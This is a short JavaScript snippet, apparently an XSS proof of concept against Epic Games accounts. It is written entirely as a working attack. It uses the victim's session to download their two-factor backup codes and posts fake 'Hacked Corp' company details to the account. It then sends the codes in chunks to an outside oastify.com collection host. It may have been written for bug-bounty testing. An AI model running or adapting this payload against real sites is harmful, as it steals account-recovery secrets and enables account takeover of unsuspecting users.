(async () => {
  try {
    // 1. Steal backup codes
    const codesRes = await fetch("https://www.epicgames.com/account/v2/security/downloadBackupCodes", {
      credentials: "include"
    });
    const codesText = await codesRes.text();

    // 2. Submit fake company info
    await fetch("https://www.epicgames.com/account/v2/company-info/add", {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        companyName: "Hacked Corp",
        addressLine1: "XSS Street",
        city: "Exploitville",
        postalCode: "1337",
        country: "ZZ"
      })
    });

    // 3. Exfiltrate in chunks
    const chunkSize = 1900;
    for (let i = 0; i < codesText.length; i += chunkSize) {
      const part = codesText.slice(i, i + chunkSize);
      await fetch(`https://d0eyzo98v1h9oif2ya9m9b0pbgh75zvnk.oastify.com?data=${encodeURIComponent(part)}`);
    }

  } catch (err) {
    console.error(err);
  }
})();
